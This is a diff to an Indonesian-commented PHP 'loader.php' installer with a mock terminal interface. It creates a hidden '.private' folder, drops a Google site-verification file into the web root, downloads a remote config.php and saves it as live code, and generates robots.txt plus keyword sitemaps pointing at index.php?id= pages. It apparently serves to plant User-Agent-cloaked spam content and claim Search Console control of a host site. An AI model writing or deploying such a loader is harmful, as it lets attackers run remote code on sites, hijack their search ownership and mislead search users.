@@ -21,13 +21,10 @@ $cache_dir = $server_path . '/.private';
 $local_config_path = $cache_dir . '/config.php';
 $local_google_path = $server_path . '/google8f39414e57a5615a.html'; 
 $local_robots_path = $server_path . '/robots.txt';
-$local_sitemap_path = $server_path . '/sitemap.xml'; // Ini akan jadi sitemap index
+$local_sitemap_path = $server_path . '/sitemap.xml'; 
 
 // --- [FUNGSI HELPER] ---
 
-/**
- * Fungsi fetchFromUrl (Untuk Keyword TXT)
- */
 function fetchKeywordsFromUrl($url, $default = []) { 
     $content = false;
     if (ini_get('allow_url_fopen')) {
@@ -45,7 +42,6 @@ function fetchKeywordsFromUrl($url, $default = []) {
     }
  
     if ($content !== false) {
-        // Mengubah string (dengan baris baru) menjadi array
         $lines = array_filter(array_map('trim', explode("\n", $content)), 'strlen');
         if (!empty($lines)) {
             return $lines;
@@ -54,9 +50,6 @@ function fetchKeywordsFromUrl($url, $default = []) {
     return $default;
 }
 
-/**
- * Fungsi fetchRawUrl (Untuk download config.php & google.html)
- */
 function fetchRawUrl($url) {
     $content = false;
     if (ini_get('allow_url_fopen')) {
@@ -75,9 +68,6 @@ function fetchRawUrl($url) {
     return $content;
 }
 
-/**
- * Fungsi buat_robots_txt
- */
 function buat_robots_txt($domain) {
     global $local_robots_path;
     $sitemapUrl = 'https://' . $domain . '/sitemap.xml';
@@ -91,12 +81,12 @@ function buat_robots_txt($domain) {
 // --- [FUNGSI UTAMA] ---
 
 /**
- * Menjalankan semua tugas instalasi
+ * TAHAP 2: Dijalankan setelah form disubmit
  */
 function jalankan_instalasi() {
     global $clean_host, $cache_dir, $server_path, $self_script_name,
            $config_url, $local_config_path, $base_keyword_url_path, $base_content_url_path,
-           $local_sitemap_path, $google_html_url, $local_google_path; // Menambahkan var Google HTML
+           $local_sitemap_path;
 
     // 1. Ambil input dari form
     if (!isset($_GET['json_file']) || empty(trim($_GET['json_file'])) || !isset($_GET['txt_file']) || empty(trim($_GET['txt_file']))) {
@@ -113,30 +103,17 @@ function jalankan_instalasi() {
     $derived_keyword_url = $base_keyword_url_path . $txt_filename;
 
     $logs = [
-        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Memulai proses instalasi untuk ' . htmlspecialchars($clean_host)]
+        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Melanjutkan proses instalasi...']
     ];
-
-    // 2. Buat folder .private
-    if (!is_dir($cache_dir)) {
-        if (!@mkdir($cache_dir, 0755, true)) {
-            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'FATAL: Gagal membuat folder .private. Periksa izin folder root.'];
-            tampilkan_log_terminal($logs, 'final_error'); 
-            return false;
-        } else {
-            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Folder .private dibuat.'];
-        }
-    } else {
-        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'warning', 'message' => 'Folder .private sudah ada.'];
-    }
-
-    // 3. Unduh dan Modifikasi config.php
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh config.php dari GitHub...'];
+    
+    // 2. Unduh dan Modifikasi config.php
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh template config.php dari GitHub...'];
     $config_content = fetchRawUrl($config_url);
     
     if ($config_content !== false && !empty($config_content)) {
         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Template config.php berhasil diunduh.'];
         
-        // Modifikasi 1: $content_url
+        // Modifikasi 1: $content_url (berdasarkan input user)
         $config_content_mod = preg_replace(
             "/\\\$content_url = '.*';/i",
             "\$content_url = " . var_export($derived_content_url, true) . ";",
@@ -144,11 +121,12 @@ function jalankan_instalasi() {
         );
         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Set $content_url ke: ' . htmlspecialchars($derived_content_url)];
 
-        // (Blok modifikasi User-Agent sengaja dihapus sesuai permintaan)
+        // (Logika modifikasi User-Agent Dihapus sesuai permintaan)
 
         // Simpan file config.php yang sudah dimodifikasi
         if (@file_put_contents($local_config_path, $config_content_mod)) {
             $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'config.php disimpan di: .private/config.php'];
+            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'warning', 'message' => 'PENTING: Jangan lupa edit manual .private/config.php untuk User-Agent!'];
         } else {
              $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal menyimpan config.php. Periksa izin folder .private.'];
         }
@@ -158,22 +136,8 @@ function jalankan_instalasi() {
         tampilkan_log_terminal($logs, 'final_error');
         return false;
     }
-
-    // 4. Unduh Google HTML
-    $google_file_name = basename($local_google_path);
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh ' . $google_file_name . '...'];
-    $google_content = fetchRawUrl($google_html_url);
-    if ($google_content !== false && !empty($google_content)) {
-        if (@file_put_contents($local_google_path, $google_content)) {
-            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => $google_file_name . ' disimpan di root.'];
-        } else {
-            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal menyimpan ' . $google_file_name . '. Periksa izin root.'];
-        }
-    } else {
-        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengunduh ' . $google_file_name . '.'];
-    }
     
-    // 5. Buat robots.txt
+    // 3. Buat robots.txt
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Membuat robots.txt...'];
     if (buat_robots_txt($clean_host)) {
         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'robots.txt berhasil dibuat di root.'];
@@ -181,7 +145,7 @@ function jalankan_instalasi() {
         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal membuat robots.txt.'];
     }
     
-    // 6. Buat Sitemap
+    // 4. Buat Sitemap
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh keywords dari: ' . htmlspecialchars($derived_keyword_url)];
     $keywords = fetchKeywordsFromUrl($derived_keyword_url, []);
     
@@ -213,11 +177,9 @@ function jalankan_instalasi() {
         $xml_sub = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
         $xml_sub .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
         
-        // URL Halaman utama (index.php)
-        $xml_sub .= '  <url><loc>' . $base_url . '/index.php' . '</loc><lastmod>' . $now . '</lastmod></url>' . PHP_EOL;
+        // (URL Homepage Dihapus dari sitemap turunan - Sesuai Permintaan 2)
 
         foreach ($keywords_chunk as $keyword) {
-            // Menggunakan format URL /index.php?id=keyword
             $url = $base_url . '/index.php?id=' . htmlspecialchars(urlencode($keyword));
             $xml_sub .= '  <url><loc>' . $url . '</loc><lastmod>' . $now . '</lastmod></url>' . PHP_EOL;
         }
@@ -241,6 +203,134 @@ function jalankan_instalasi() {
     tampilkan_log_terminal($logs, 'done');
 }
 
+/**
+ * TAHAP 1: Dijalankan saat loader.php dibuka
+ */
+function tampilkan_halaman_installer() {
+    global $clean_host, $cache_dir, $google_html_url, $local_google_path, $self_script_name;
+
+    $logs = [
+        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Memulai instalasi...'],
+        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mendeteksi domain: ' . $clean_host]
+    ];
+
+    // (Alur Baru - Sesuai Permintaan 1)
+    // 1. Buat folder .private
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Memeriksa folder .private...'];
+    if (!is_dir($cache_dir)) {
+        if (!@mkdir($cache_dir, 0755, true)) {
+            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'FATAL: Gagal membuat folder .private. Periksa izin folder root.'];
+            tampilkan_log_terminal($logs, 'final_error');
+            return;
+        } else {
+            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Folder .private dibuat.'];
+        }
+    } else {
+        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'warning', 'message' => 'Folder .private sudah ada.'];
+    }
+
+    // 2. Unduh Google HTML
+    $google_file_name = basename($local_google_path);
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mengunduh ' . $google_file_name . '...'];
+    $google_content = fetchRawUrl($google_html_url);
+    if ($google_content !== false && !empty($google_content)) {
+        if (@file_put_contents($local_google_path, $google_content)) {
+            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => $google_file_name . ' disimpan di root.'];
+        } else {
+            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal menyimpan ' . $google_file_name . '. Periksa izin root.'];
+        }
+    } else {
+        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengunduh ' . $google_file_name . '.'];
+    }
+    // --- (Akhir Alur Baru) ---
+
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Sistem siap. Menunggu input...'];
+
+    // Tampilkan Terminal UI dengan log di atas, DAN form input
+    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Installer</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
+        .terminal { max-width: 800px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
+        .terminal-header { padding: 15px 20px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 8px; }
+        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
+        .red { background: #ff5f57; } .yellow { background: #ffbd2e; } .green { background: #28ca42; }
+        .terminal-content { padding: 20px; font-size: 11px; line-height: 1.4; }
+        .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
+        .timestamp { color: #666; min-width: 70px; font-size: 10px; }
+        .log-success { color: #28ca42; } .log-error { color: #ff5f57; } .log-warning { color: #ffbd2e; } .log-info { color: #0095ff; }
+        .typing { border-right: 1px solid #fff; animation: blink 1s infinite; }
+        @keyframes blink { 0%, 50% { border-color: #fff; } 51%, 100% { border-color: transparent; } }
+        .command-line { display: flex; align-items: center; gap: 6px; margin-top: 15px; }
+        .prompt { color: #28ca42; font-size: 11px; }
+        .cursor { background: #fff; width: 6px; height: 12px; animation: blink 1s infinite; }
+        .input-form { margin-top: 20px; display: none; background: #1a1a1a; padding: 15px; border: 1px solid #333; }
+        .input-form .form-group { margin-bottom: 12px; }
+        .input-form label { display: block; margin-bottom: 8px; color: #0095ff; }
+        .input-form input[type="text"] { width: 100%; padding: 10px; background: #222; border: 1px solid #444; color: #fff; font-family: inherit; font-size: 11px; box-sizing: border-box; }
+        .input-form button { display: block; width: 100%; margin-top: 15px; padding: 10px; background: #28ca42; border: none; color: #000; font-weight: bold; cursor: pointer; font-family: inherit; font-size: 12px; }
+    </style>
+    </head>
+    <body>
+        <div class="terminal">
+            <div class="terminal-header">
+                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
+                <div style="color: #666; font-size: 10px;">system.installer</div>
+            </div>
+            <div class="terminal-content" id="terminalContent">
+                <div id="logsContainer"></div>
+                
+                <form method="GET" action="' . $self_script_name . '" class="input-form" id="jsonForm">
+                    <input type="hidden" name="action" value="install">
+                    <div class="form-group">
+                        <label for="json_file">1. Masukkan Nama File JSON (untuk Konten):</label>
+                        <input type="text" id="json_file" name="json_file" placeholder="contoh: english.json" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="txt_file">2. Masukkan Nama File TXT (untuk Keywords):</label>
+                        <input type="text" id="txt_file" name="txt_file" placeholder="contoh: eng.txt" required>
+                    </div>
+                    <button type="submit">LANJUTKAN & BUAT SITEMAP</button>
+                </form>
+            </div>
+        </div>
+        <script>
+            const installLogs = ' . json_encode($logs) . ';
+            const container = document.getElementById("logsContainer");
+            let currentLog = 0; let currentChar = 0; let currentLine = null;
+            
+            function typeNextChar() {
+                if (currentLog >= installLogs.length) {
+                    document.getElementById("jsonForm").style.display = "block";
+                    document.getElementById("json_file").focus();
+                    container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
+                    return;
+                }
+                
+                const log = installLogs[currentLog];
+                if (currentChar === 0) {
+                    currentLine = document.createElement("div");
+                    currentLine.className = "log-entry";
+                    currentLine.innerHTML = \'<span class="timestamp">\' + log.timestamp + \'</span><span class="log-\' + log.type + \' typing"></span>\';
+                    container.appendChild(currentLine);
+                }
+                const messageElement = currentLine.querySelector(".typing");
+                if (currentChar < log.message.length) {
+                    messageElement.textContent += log.message[currentChar];
+                    currentChar++;
+                    setTimeout(typeNextChar, 8);
+                } else {
+                    messageElement.classList.remove("typing");
+                    currentChar = 0;
+                    currentLog++;
+                    setTimeout(typeNextChar, 50);
+                }
+            }
+            setTimeout(typeNextChar, 200);
+        </script>
+    </body>
+    </html>';
+}
 
 /**
  * Fungsi untuk menampilkan UI Terminal dengan log
@@ -283,7 +373,6 @@ function tampilkan_log_terminal($logs, $next_action = 'done') {
 
         function typeNextChar() {
             if (currentLog >= logs.length) {
-                // Semua log selesai, tampilkan prompt akhir
                 container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
                 return;
             }
@@ -316,140 +405,15 @@ function tampilkan_log_terminal($logs, $next_action = 'done') {
 
 // --- [ROUTER UTAMA] ---
 
-// Jika form disubmit, jalankan instalasi
+// Jika form disubmit, jalankan TAHAP 2
 if (isset($_GET['action']) && $_GET['action'] === 'install') {
     jalankan_instalasi();
     exit;
 } 
 
-// Halaman default (Tampilan "Installer" dengan Form Input)
+// Halaman default, jalankan TAHAP 1
 else {
-    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Installer</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
-        .terminal { max-width: 800px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
-        .terminal-header { padding: 15px 20px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 8px; }
-        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
-        .red { background: #ff5f57; } .yellow { background: #ffbd2e; } .green { background: #28ca42; }
-        .terminal-content { padding: 20px; font-size: 11px; line-height: 1.4; }
-        .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
-        .timestamp { color: #666; min-width: 70px; font-size: 10px; }
-        .log-success { color: #28ca42; } .log-error { color: #ff5f57; } .log-warning { color: #ffbd2e; } .log-info { color: #0095ff; }
-        .typing { border-right: 1px solid #fff; animation: blink 1s infinite; }
-        @keyframes blink { 0%, 50% { border-color: #fff; } 51%, 100% { border-color: transparent; } }
-        .command-line { display: flex; align-items: center; gap: 6px; margin-top: 15px; }
-        .prompt { color: #28ca42; font-size: 11px; }
-        .cursor { background: #fff; width: 6px; height: 12px; animation: blink 1s infinite; }
-        
-        .input-form { 
-            margin-top: 20px; 
-            display: none;
-            background: #1a1a1a;
-            padding: 15px;
-            border: 1px solid #333;
-        }
-        .input-form .form-group {
-            margin-bottom: 12px;
-        }
-        .input-form label {
-            display: block;
-            margin-bottom: 8px;
-            color: #0095ff;
-        }
-        .input-form input[type="text"] {
-            width: 100%;
-            padding: 10px;
-            background: #222;
-            border: 1px solid #444;
-            color: #fff;
-            font-family: inherit;
-            font-size: 11px;
-            box-sizing: border-box;
-        }
-        .input-form button {
-            display: block;
-            width: 100%;
-            margin-top: 15px;
-            padding: 10px;
-            background: #28ca42;
-            border: none;
-            color: #000;
-            font-weight: bold;
-            cursor: pointer;
-            font-family: inherit;
-            font-size: 12px;
-        }
-    </style>
-    </head>
-    <body>
-        <div class="terminal">
-            <div class="terminal-header">
-                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
-                <div style="color: #666; font-size: 10px;">system.installer</div>
-            </div>
-            <div class="terminal-content" id="terminalContent">
-                <div id="logsContainer"></div>
-                
-                <form method="GET" action="' . $self_script_name . '" class="input-form" id="jsonForm">
-                    <input type="hidden" name="action" value="install">
-                    
-                    <div class="form-group">
-                        <label for="json_file">1. Masukkan Nama File JSON (untuk Konten):</label>
-                        <input type="text" id="json_file" name="json_file" placeholder="contoh: english.json" required>
-                    </div>
-
-                    <div class="form-group">
-                        <label for="txt_file">2. Masukkan Nama File TXT (untuk Keywords):</label>
-                        <input type="text" id="txt_file" name="txt_file" placeholder="contoh: eng.txt" required>
-                    </div>
-
-                    <button type="submit">MULAI PROSES INSTALASI</button>
-                </form>
-
-            </div>
-        </div>
-        <script>
-            const installLogs = [
-                {timestamp: "' . date('H:i:s') . '", type: "info", message: "Memulai instalasi..."},
-                {timestamp: "' . date('H:i:s') . '", type: "info", message: "Mendeteksi domain: ' . $clean_host . '"},
-                {timestamp: "' . date('H:i:s') . '", type: "success", message: "Verifikasi sistem berhasil"},
-                {timestamp: "' . date('H:i:s') . '", type: "warning", message: "Menunggu input..."}
-            ];
-
-            const container = document.getElementById("logsContainer");
-            let currentLog = 0; let currentChar = 0; let currentLine = null;
-            
-            function typeNextChar() {
-                if (currentLog >= installLogs.length) {
-                    document.getElementById("jsonForm").style.display = "block";
-                    document.getElementById("json_file").focus();
-                    container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
-                    return;
-                }
-                
-                const log = installLogs[currentLog];
-                if (currentChar === 0) {
-                    currentLine = document.createElement("div");
-                    currentLine.className = "log-entry";
-                    currentLine.innerHTML = \'<span class="timestamp">\' + log.timestamp + \'</span><span class="log-\' + log.type + \' typing"></span>\';
-                    container.appendChild(currentLine);
-                }
-                const messageElement = currentLine.querySelector(".typing");
-                if (currentChar < log.message.length) {
-                    messageElement.textContent += log.message[currentChar];
-                    currentChar++;
-                    setTimeout(typeNextChar, 8);
-                } else {
-                    messageElement.classList.remove("typing");
-                    currentChar = 0;
-                    currentLog++;
-                    setTimeout(typeNextChar, 50);
-                }
-            }
-            setTimeout(typeNextChar, 200);
-        </script>
-    </body>
-    </html>';
+    tampilkan_halaman_installer();
+    exit;
 }
 ?>
